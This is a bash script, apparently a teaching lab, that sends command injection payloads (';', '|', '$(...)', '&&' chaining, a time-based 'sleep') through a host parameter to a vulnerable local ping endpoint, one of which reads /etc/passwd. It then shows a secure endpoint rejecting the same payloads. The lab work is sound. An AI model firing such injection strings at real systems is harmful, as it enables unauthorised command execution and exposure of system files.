#!/usr/bin/env bash
# run-attacks.sh — command injection attacks against the running lab (port 3003).
# All injected commands are harmless, read-only diagnostics (id, uname, whoami, cat).
set -u
B="http://localhost:3003"
hr() { printf '\n============================================================\n%s\n============================================================\n' "$1"; }

hr "CONTROL — a legitimate request"
curl -s -G $B/ping-vulnerable --data-urlencode "host=127.0.0.1" | head -2

hr "ATTACK 1 — command chaining with ;  (run an extra command)"
echo "host = 127.0.0.1; id"
curl -s -G $B/ping-vulnerable --data-urlencode "host=127.0.0.1; id"

hr "ATTACK 2 — pipe to read a sensitive file"
echo "host = 127.0.0.1 | head -3 /etc/passwd"
curl -s -G $B/ping-vulnerable --data-urlencode "host=127.0.0.1 | head -3 /etc/passwd"

hr "ATTACK 3 — command substitution \$(...)"
echo "host = \$(whoami)"
curl -s -G $B/ping-vulnerable --data-urlencode 'host=$(whoami)'

hr "ATTACK 4 — AND-chained command (&&)"
echo "host = 127.0.0.1 && uname -a"
curl -s -G $B/ping-vulnerable --data-urlencode "host=127.0.0.1 && uname -a"

hr "ATTACK 5 — blind / time-based (no echoed output needed)"
echo "host = 127.0.0.1; sleep 3   (watch the elapsed time)"
curl -s -o /dev/null -w "elapsed: %{time_total}s\n" -G $B/ping-vulnerable --data-urlencode "host=127.0.0.1; sleep 3"

hr "SECURE — the same payloads are now powerless"
echo "[S1] injection rejected by validation:"
curl -s -G $B/ping-secure --data-urlencode "host=127.0.0.1; id"
echo "[S2] command substitution rejected:"
curl -s -G $B/ping-secure --data-urlencode 'host=$(whoami)'
echo "[S3] legitimate host still works:"
curl -s -G $B/ping-secure --data-urlencode "host=127.0.0.1" | head -2
